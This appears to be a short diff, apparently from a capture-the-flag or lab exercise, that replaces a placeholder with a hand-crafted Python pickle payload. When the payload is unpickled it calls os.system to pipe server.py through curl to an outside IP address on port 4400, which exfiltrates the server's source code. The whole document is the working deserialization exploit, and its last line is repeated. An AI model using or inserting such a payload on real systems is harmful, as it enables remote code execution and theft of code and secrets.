@@ -1,1 +1,5 @@
-content-of-your-pickle-file
+cos
+system
+(S'cat server.py | curl -d @- 10.192.130.36:4400'
+tR.'
+tR.
